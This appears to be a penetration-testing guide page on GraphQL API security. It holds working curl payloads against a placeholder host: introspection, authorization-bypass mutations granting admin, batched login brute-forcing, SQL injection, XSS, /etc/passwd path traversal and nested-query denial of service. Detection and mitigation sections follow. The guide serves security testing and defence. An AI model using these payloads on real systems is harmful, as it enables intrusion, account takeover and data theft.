% Filename: 04-web-testing/api-testing/graphql.md
% Display name: GraphQL Testing
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application)
% Authors: @TristanInSec

# GraphQL Testing

## Overview

GraphQL is a query language for APIs that allows clients to request exactly the data they need. Unlike REST (which has fixed endpoints), GraphQL typically exposes a single endpoint (`/graphql`) that accepts structured queries. This flexibility introduces unique attack vectors: introspection reveals the entire schema, batching enables brute-force attacks in a single request, and the type system can be exploited to bypass authorization checks.

GraphQL adoption has grown significantly in modern web and mobile applications. Security testing requires understanding the query language, schema structure, and common implementation mistakes.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application

## Prerequisites

- Target application uses GraphQL (typically a single `/graphql` endpoint)
- Ability to send POST requests with JSON body (or GET with query parameter)
- Understanding of GraphQL query syntax (queries, mutations, subscriptions)

## Detection Methodology

### Identifying GraphQL Endpoints

Common GraphQL endpoint paths:

```text
/graphql
/graphql/v1
/api/graphql
/graphql/api
/graphql/console
/v1/graphql
/v1/explorer
/altair
/playground
/graphiql
```

```bash
# ffuf
# https://github.com/ffuf/ffuf
# Fuzz for GraphQL endpoints
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/graphql.txt -mc 200,400,405
```

**Confirm GraphQL by sending a basic query:**

```bash
# curl
# https://curl.se/
# POST request (most common)
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'

# GET request (some implementations)
curl -s "http://target.com/graphql?query=%7B__typename%7D"
```

A valid GraphQL endpoint returns JSON with a `data` key (e.g., `{"data":{"__typename":"Query"}}`).

### Boundary Testing

```bash
# curl
# https://curl.se/
# Test for introspection (see Introspection section below)
# Test for verbose error messages
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{nonExistentField}"}'

# Check if batching is allowed
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{__typename}"},{"query":"{__typename}"}]'
```

## Techniques

### Introspection

Introspection allows clients to query the schema itself — listing all types, fields, queries, and mutations. This is the most valuable first step in GraphQL testing.

**Full introspection query:**

```bash
# curl
# https://curl.se/
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"}'
```

**List all queries and mutations:**

```bash
# curl
# https://curl.se/
# List query type fields (available queries)
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name args { name type { name } } } } } }"}'

# List mutation type fields (available mutations)
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'
```

**Inspect a specific type:**

```bash
# curl
# https://curl.se/
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { name fields { name type { name } } } }"}'
```

If introspection is disabled, the server returns an error. Try bypassing:

```bash
# curl
# https://curl.se/
# GET request instead of POST
curl -s "http://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# Field suggestion exploitation — send a misspelled field name
# GraphQL often suggests valid field names in the error message
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usr { id } }"}'
# Error: "Did you mean 'user'?" reveals the field name
```

### Authorization Bypass

GraphQL resolves each field independently. Authorization may be enforced on one query path but not another that returns the same data.

```bash
# curl
# https://curl.se/
# Direct query may be protected
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"{ user(id: 1) { email role } }"}'

# But nested query through a relationship may bypass the check
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"{ posts { author { email role } } }"}'

# Mutations may lack authorization that queries enforce
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"mutation { updateUser(id: 1, input: {role: \"admin\"}) { id role } }"}'
```

### Batching Attacks

GraphQL supports sending multiple operations in a single request. This can bypass rate limiting that counts HTTP requests rather than operations.

**Array-based batching:**

```bash
# curl
# https://curl.se/
# Brute-force login in a single HTTP request
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation { login(username: \"admin\", password: \"password1\") { token } }"},
    {"query":"mutation { login(username: \"admin\", password: \"password2\") { token } }"},
    {"query":"mutation { login(username: \"admin\", password: \"password3\") { token } }"}
  ]'
```

**Alias-based batching (when array batching is disabled):**

```bash
# curl
# https://curl.se/
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { a1: login(username: \"admin\", password: \"password1\") { token } a2: login(username: \"admin\", password: \"password2\") { token } a3: login(username: \"admin\", password: \"password3\") { token } }"}'
```

### Injection via GraphQL

GraphQL queries can carry injection payloads to the backend resolvers:

```bash
# curl
# https://curl.se/
# SQL injection through GraphQL argument
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(name: \"admin\\\" OR 1=1 --\") { id email } }"}'

# XSS via stored mutation (if output is rendered in HTML)
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateProfile(bio: \"<script>alert(1)</script>\") { id } }"}'

# Path traversal via file-related query
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ file(path: \"../../../etc/passwd\") { content } }"}'
```

The injection target depends entirely on how the resolver handles the argument — GraphQL itself is just the transport layer.

### Denial of Service via Nested Queries

If the schema has circular relationships (e.g., User has Posts, Post has Author), deeply nested queries consume exponential server resources:

```bash
# curl
# https://curl.se/
# Deeply nested circular query
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { posts { author { posts { author { posts { author { id } } } } } } } }"}'
```

Mitigated servers limit query depth (typically 7-10 levels) or query complexity scores.

### Field Stuffing

Request all discovered fields to find sensitive data the front-end doesn't normally request:

```bash
# curl
# https://curl.se/
# After introspection reveals User type has many fields
curl -s -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"{ user(id: 42) { id email name role passwordHash apiKey createdAt lastLoginIp } }"}'
```

## Detection Methods

### Network-Based Detection

- Introspection queries (`__schema`, `__type`) from non-development environments
- Array or alias-based batch requests with high operation counts
- Deeply nested queries (circular relationships beyond normal depth)
- Injection payloads in GraphQL string arguments
- Sequential ID enumeration in query arguments

### Host-Based Detection

- GraphQL resolver errors indicating unauthorized field access
- High CPU/memory consumption from complex nested queries
- Authorization failures on mutation operations
- Database query patterns inconsistent with normal application usage

## Mitigation Strategies

- **Disable introspection in production** — introspection should only be available in development environments. Most GraphQL servers support disabling it via configuration
- **Query depth and complexity limits** — enforce maximum query depth (e.g., 10 levels) and assign complexity scores to fields. Reject queries exceeding the threshold
- **Field-level authorization** — enforce authorization in every resolver, not just at the query entry point. Use middleware or directives to annotate which roles can access each field
- **Rate limiting per operation** — count GraphQL operations, not HTTP requests. Limit both array-based and alias-based batching
- **Input validation** — validate and sanitize all GraphQL arguments in resolvers before passing them to databases or other backends
- **Allowlist queries** — in high-security environments, maintain an allowlist of permitted queries (persisted queries) and reject arbitrary queries

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - GraphQL API Vulnerabilities](https://portswigger.net/web-security/graphql)
- [OWASP - GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
